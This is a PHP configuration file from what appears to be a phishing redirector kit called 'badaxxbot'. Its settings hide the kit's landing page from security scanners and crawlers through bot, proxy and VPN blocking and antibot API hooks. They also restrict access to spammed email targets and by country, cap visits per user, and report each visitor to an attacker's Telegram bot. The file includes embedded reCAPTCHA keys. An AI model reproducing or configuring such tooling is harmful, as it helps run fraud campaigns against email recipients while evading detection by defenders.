<?php

error_reporting(0);

//activation key
$activated = 'key';


//badaxxbot blocker //please turn this false if you using killbot.org or antibot.pw
$mustleak_bot = false;    //block Hosting/Proxy/Bad IP/VPN

//everything that has to do with captcha
$grecaptcha = false; //enable captcha 
$grecaptcha_js_method = false;  //if captcha still shows after you turn it off , please switch to true
$grecaptcha_key = '6LeLIuUcAAAAAIJpWzLYPv-79COjEeZFv4fNBmiF';
$grecaptcha_secret = '6LeLIuUcAAAAAHAUwiaS-mDpHeNhdocHJgMoH4My';

//turn of secret key access
$secret_key_access = false; //this can be very important to prevent bot from emails and others 

//antibot.pw api key here  //pease turn off $mustleak_bot if you plan to use this 
$antibotpw_api = 'apikey';   //antibot.pw api key here 

//killbot.org api key here  ////pease turn off $mustleak_bot if you pan to use this 
$kill_bot_api = 'apikey';   // if you plan to use https://killbot.org/

//faking method url  //not sure if this is useful .... but works
$fuck1 = ('id');  // please change this to match script.txt fuck 1
$fuck2 = ('products');  // please change this to match script.txt fuck2


//applying strange but effective method blocking 
$visitcount = 2;  // How many times a user is allowed to access your page
$emailaccess_only = false;  // Change to true to allow only spammed email access  format  ?data=email@email.com&news  //news here means whatever is in fuck1
$country_lock = false;  // Change to true to block access by country
$country_code = ["FR", "UK", "US"];  // allowed countries //caseSensitive   // view code list http://www.analysespider.com/ip2country/country_code.html



//report to telegram
$full_notification = true;
$bot_token = 'bot_id';  //If you hate spam message, turn $full_notification false
$chat_id =  12345689; //telegram userid for report 


//utility ,  Change if you understand, else skip here
$url_file = 'badaxxbot/urls.txt';
$email_list = 'badaxxbot/email/lists.txt';


//backup url for redirector //  do not edit only if need be
//replace host incase key can not authenticate 
// vv.allmarketseller.xyz
$checker_url = 'vv.mustleak.com';
$record_visit = false;  //  this will keep record of all visits in record folder,  //false is better to avoid creating big file and slowing down 



?>
